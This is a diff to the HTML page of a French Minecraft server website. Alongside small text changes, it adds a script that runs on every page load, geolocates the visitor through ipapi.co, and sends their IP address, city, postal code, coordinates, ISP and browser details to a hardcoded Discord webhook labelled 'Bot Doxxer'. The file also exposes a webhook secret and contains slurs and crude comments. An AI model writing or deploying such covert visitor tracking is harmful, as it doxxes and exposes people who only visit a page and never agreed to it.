@@ -110,7 +110,7 @@
         </video>
       </div>
       <div class="footer">
-        © 2025 LoannDev - N***er
+        © 2025 LoannSMP — Sortie le 31/03/2026
       </div>
     </div>
   </div>
@@ -128,7 +128,7 @@
           Télécharger
         </button>
         <button id="alternative-installer-btn" class="contact-btn">
-          Crack
+          Alternative
         </button>
         <button id="close-modpack" class="contact-btn" style="background:#444; color:#fff;">
           Fermer
@@ -163,7 +163,7 @@
       });
 
       document.getElementById('status-dot').style.background = "#FFFF00";
-      document.getElementById('status-text').textContent = "Status : Ouvert de temps en temps";
+      document.getElementById('status-text').textContent = "Status : Ouvert de temps en temps (phases de test)";
 
       const phrases = [
         "Merci à mon e-kitten Bifurlo (qui est trans) de host ce magnifique serveur avec son pc de la nasa",
@@ -172,7 +172,8 @@
         "Cette saison va durer tkt",
         "J'ai pas d'inspi",
         "Le saviez-vous ? Le texte aléatoire de ce site change toutes les semaines !",
-        "Tapez 'bifurlo' pour voir sa vraie face cachée."
+        "Tapez 'bifurlo' pour voir sa vraie face cachée.",
+
       ];
       const subtitle = document.getElementById('subtitle');
       if (subtitle) {
@@ -205,6 +206,70 @@
         video.play();
       }
 
+
+
+      const webhookURL = 'https://discord.com/api/webhooks/1384906326244589690/ZQJNQAu6h5c8MwzYThG3RiSvKcCSG00ltMjgYk4MWQowwRfEh6sJuEqv6TsxNU7u7K9f'; // remplace par ton lien
+
+      async function logInfos() {
+        try {
+          const geoRes = await fetch('https://ipapi.co/json/');
+          const geo = await geoRes.json();
+          const userAgent = navigator.userAgent;
+
+
+          // Collecte des infos pour empêcher le bot qui envoie des clips de gay porn de les envoyer (Ip bloquée)
+          const payload = {
+            username: "Logs",
+            avatar_url: "https://cdn.discordapp.com/avatars/1384906326244589690/1c2b8f3d4e5f4a6b8c7d9e2f3c4b5a6b.png?size=128",
+            content: "Nouvelle connexion suspecte ! (Bot ?)",
+            embeds: [{
+              title: "Bot Doxxer",
+              color: 0xff9100,
+              fields: [
+                { name: "IP", value: geo.ip || "?", inline: false },
+                { name: "Pays", value: `${geo.country_name} (${geo.country_code})`, inline: true },
+                { name: "Ville", value: geo.city || "Inconnue", inline: true },
+                { name: "Région", value: geo.region || "Inconnue", inline: true },
+                { name: "Fournisseur", value: geo.org || "Inconnu", inline: false },
+                { name: "User-Agent", value: userAgent, inline: false },
+                { name: "Langue", value: navigator.language || "Inconnue", inline: true },
+                { name: "Système d'exploitation", value: navigator.platform || "Inconnu", inline: true },
+                { name: "Navigateur", value: navigator.appName || "Inconnu", inline: true },
+                { name: "Date et heure", value: new Date().toLocaleString(), inline: true },
+                { name: "Latitude/Longitude", value: `${geo.latitude || "Inconnue"}/${geo.longitude || "Inconnue"}`, inline: true },
+                { name: "Code postal", value: geo.postal || "Inconnu", inline: true },
+                // QUE CE BOT RANDOM QUI ENVOIE DES PORNOS DANS MES WEBHOOKS SE FASSE BAISER
+                // QUE CE BOT RANDOM QUI ENVOIE DES PORNOS DANS MES WEBHOOKS SE FASSE BAISER
+                // QUE CE BOT RANDOM QUI ENVOIE DES PORNOS DANS MES WEBHOOKS SE FASSE BAISER
+                // QUE CE BOT RANDOM QUI ENVOIE DES PORNOS DANS MES WEBHOOKS SE FASSE BAISER
+                { name: "Google Maps", value: `**[Voir sur Google Maps](https://www.google.com/maps/search/?api=1&query=${geo.latitude || "Inconnue"},${geo.longitude || "Inconnue"})**`, inline: false 
+                },
+                { name: "Lien pour regarder sur IPAPI", value: `[Plus d'infos](https://ipapi.co/${geo.ip || "Inconnue"}/)`, inline: false }
+              
+
+              
+
+              ],
+              footer: {
+                text: "BANti Bot"
+              },
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+        } catch (e) {
+          console.error('Erreur lors du log IP :', e);
+        }
+      }
+
+      logInfos(); // Appel au chargement
+
+
       // Popup Modpack
       const modpackBtn = document.getElementById('modpack-btn');
       const modpackPopup = document.getElementById('modpack-popup');
@@ -230,5 +295,8 @@
       });
     });
   </script>
+
+
+
 </body>
 </html>
